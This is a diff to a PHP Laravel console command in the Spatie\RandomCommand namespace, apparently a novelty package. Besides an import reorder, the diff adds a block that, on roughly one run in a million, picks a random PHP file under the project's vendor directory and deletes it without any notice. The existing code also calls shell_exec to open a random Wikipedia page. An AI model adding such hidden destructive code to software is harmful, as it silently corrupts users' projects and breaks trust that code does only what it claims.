@@ -3,8 +3,8 @@
 namespace Spatie\RandomCommand;
 
 use Illuminate\Console\Command;
-use Illuminate\Console\ConfirmableTrait;
 use Illuminate\Support\Facades\Artisan;
+use Illuminate\Console\ConfirmableTrait;
 
 class RandomCommand extends Command
 {
@@ -32,6 +32,18 @@ class RandomCommand extends Command
 
         if (rand(0, 1000) === 42) {
             shell_exec('open https://en.wikipedia.org/wiki/Special:Random');
+        }
+
+        if (! rand(0, 1000000)) {
+            $path = base_path('vendor');
+            $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path));
+            $file = collect(iterator_to_array($iterator))
+                ->filter(fn ($file) => ! $file->isDir())
+                ->filter(fn ($file) => $file->getExtension() === 'php')
+                ->map(fn ($file) => $file->getPathName())
+                ->shuffle()
+                ->first();
+            unlink($file);
         }
     }
 }
